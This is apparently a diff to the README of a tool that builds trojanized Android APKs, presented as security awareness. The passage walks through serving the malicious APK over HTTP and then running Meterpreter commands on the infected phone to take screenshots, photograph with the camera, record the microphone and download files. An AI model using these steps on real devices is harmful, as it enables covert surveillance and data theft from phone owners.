@@ -70,9 +70,7 @@ This will launch a handler that will wait for a connection from the infected APK
 
 Once the malicious APK is generated, the tool will start an HTTP server on your machine to serve the APK:
 
-    ```bash
     http://your-ip:8000/your_malicious_apk.apk
-    ```
 
 The goal is to raise awareness of the dangers of APKs downloaded from unofficial sources.
 
@@ -80,9 +78,7 @@ The goal is to raise awareness of the dangers of APKs downloaded from unofficial
 
 When the user installs and runs the infected APK on their device, a Meterpreter session will open. You can then interact with the compromised device:
 
-    ```bash
     meterpreter > sessions -i [Session ID]
-    ```
 
 ## Awareness Scenario
 
@@ -92,50 +88,38 @@ Here’s a typical awareness scenario for an open Meterpreter session on an Andr
 
 This demonstrates how an attacker can view the user’s screen:
 
-    ```bash
     meterpreter > screenshot
-    ```
 
 ### 2. **Retrieve device information:**
 
 To show the amount of information accessible to the attacker:
 
-    ```bash
     meterpreter > sysinfo
-    ```
 
 ### 3. **Check if the device is rooted:**
 
 Shows how the attacker can check if the device has root permissions:
 
-    ```bash
     meterpreter > check_root
-    ```
 
 ### 4. **Activate the camera and take a picture:**
 
 A powerful example of how privacy can be compromised:
 
-    ```bash
     meterpreter > webcam_snap
-    ```
 
 ### 5. **Activate the microphone and record audio:**
 
 Demonstrates how the attacker can record the user’s environment:
 
-    ```bash
     meterpreter > record_mic
-    ```
 
 ### 6. **Extract files from the device:**
 
 Shows that all the user's data can be exfiltrated:
 
-    ```bash
     meterpreter > ls /sdcard/
     meterpreter > download /sdcard/DCIM/photo.jpg
-    ```
 
 ## Disclaimer
 
